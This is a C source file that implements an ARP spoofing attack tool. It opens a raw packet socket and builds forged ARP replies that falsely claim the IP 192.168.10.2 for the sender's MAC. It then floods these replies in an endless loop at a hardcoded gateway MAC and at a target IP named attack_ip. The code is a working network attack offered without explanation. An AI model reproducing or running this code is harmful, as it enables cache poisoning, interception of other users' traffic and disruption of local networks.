/**
作者：space 蒋
**/

#include <stdio.h>
#include <stdio.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>
#include <net/if.h>
#include<netinet/ip.h>
#include<netinet/if_ether.h>
#include <sys/types.h>
#include <errno.h>
#include<string.h>
#include <sys/ioctl.h>
#include <unistd.h>

char wg_mac[6]={0x00,0x22,0xaa,0xb7,0x42,0xc3};
char wg_ip[4]={192,168,10,2};
char attack_ip[4]={192,168,10,127};
char* dev="eth0";


char buf[ETH_DATA_LEN];
struct ether_header * eth_h =buf;
struct	ether_arp*  arp_h =buf +14;
static int get_if_index(int sockfd, char *inf)
{
    struct ifreq ifr;

    ifr.ifr_name[IFNAMSIZ-1] = '\0';
    strncpy(ifr.ifr_name, inf, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1) {
        fprintf(stderr, "ERROR: calling ioctl(sockfd, SIOCGIFINDEX, ...): %s\n",
                strerror(errno));
        return -1;
    }

    return ifr.ifr_ifindex;
}
static int get_if_ether_addr(int sockfd, char *inf, u_int8_t *hostaddr)
{
    struct ifreq ifr;

    ifr.ifr_name[IFNAMSIZ-1] = '\0';
    strncpy(ifr.ifr_name, inf, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        fprintf(stderr, "ERROR: calling ioctl(sockfd, SIOCGIFHWADDR, ...): %s\n",
                strerror(errno));
        return 0;
    }

    if (ifr.ifr_hwaddr.sa_family == ARPHRD_ETHER) {
        memcpy(hostaddr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
        return 1;
    } else {
        return 0;
    }
}
static int build_sockaddr_ll(int sockfd,char *infs, struct sockaddr_ll *addr)
{
    int ifindex;

    memset(addr, '\0', sizeof(*addr));
    addr->sll_family = AF_PACKET;

    ifindex = get_if_index(sockfd,infs);
    if (ifindex == -1) {
        fprintf(stderr, "ERROR: could not obtain interface index\n");
        return 0;
    }
    addr->sll_ifindex = ifindex;


    if (get_if_ether_addr(sockfd, infs, addr->sll_addr) == 0) {
        fprintf(stderr,
                "ERROR: interface %s is not a standard Ethernet interface\n",
                infs);
        return 0;
    }

    addr->sll_halen = ETH_ALEN;

    return 1;
}
void build_frame()
{
    //    char cj[6]={0xbc,0xee,0x7b,0x75,0xf8,0xbf};
    //    char zzq[6] ={0xe0,0x3f,0x49,0x7c,0x1e,0x95};
    //    char qg[6] ={0xbc,0xee,0x7b,0x75,0xf9,0x4e};

    eth_h->ether_shost[0]=0x08;
    eth_h->ether_shost[1]=0x08;
    eth_h->ether_shost[2]=0x08;
    eth_h->ether_shost[3]=0x02;
    eth_h->ether_shost[4]=0x02;
    eth_h->ether_shost[5]=0x02;

    eth_h->ether_dhost[0] = wg_mac[0];
    eth_h->ether_dhost[1] = wg_mac[1];
    eth_h->ether_dhost[2] = wg_mac[2];
    eth_h->ether_dhost[3] = wg_mac[3];
    eth_h->ether_dhost[4] = wg_mac[4];
    eth_h->ether_dhost[5] = wg_mac[5];


    eth_h->ether_type = htons(ETHERTYPE_ARP);
    arp_h->ea_hdr.ar_hrd = htons(0x0001);
    arp_h->ea_hdr.ar_pro =htons(0x0800);

    arp_h->ea_hdr.ar_hln = 6;
    arp_h->ea_hdr.ar_pln = 4;
    arp_h->ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy(arp_h->arp_sha,eth_h->ether_shost,6);
    memcpy(arp_h->arp_tha,eth_h->ether_dhost,6);
    arp_h->arp_spa[0] = wg_ip[0];
    arp_h->arp_spa[1] = wg_ip[1];
    arp_h->arp_spa[2] = wg_ip[2];
    arp_h->arp_spa[3] = wg_ip[3];

    arp_h->arp_tpa[0]=attack_ip[0];
    arp_h->arp_tpa[1]=attack_ip[1];
    arp_h->arp_tpa[2]=attack_ip[2];
    arp_h->arp_tpa[3]=attack_ip[3];
}

int main(int argc, char *argv[])
{
    struct sockaddr_ll sll_addr;
    int size;
    int sockfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL ));
    if(sockfd==-1)
    {
        perror("can not build a socket\n");
        return;
    }
    build_frame();
    if (get_if_ether_addr(sockfd, dev, eth_h->ether_shost) == 0) {
        fprintf(stderr,
                "ERROR: cannot build frame without destination address\n");
        return 0;
    }
    memset(buf+46, '\0', 14);

    build_sockaddr_ll(sockfd,dev,&sll_addr);
    while(1)
    {
        size=sendto(sockfd,
                    buf,
                    60,
                    0,
                    (struct sockaddr *)&sll_addr,
                    sizeof(sll_addr));
        if (size== -1) {
            fprintf(stderr, "ERROR: failed to sendto(...): %s\n", strerror(errno));
        }
        printf("size is %d\n",size);
        //        sleep(1);
    }
    printf("Hello World!\n");
    return 0;
}
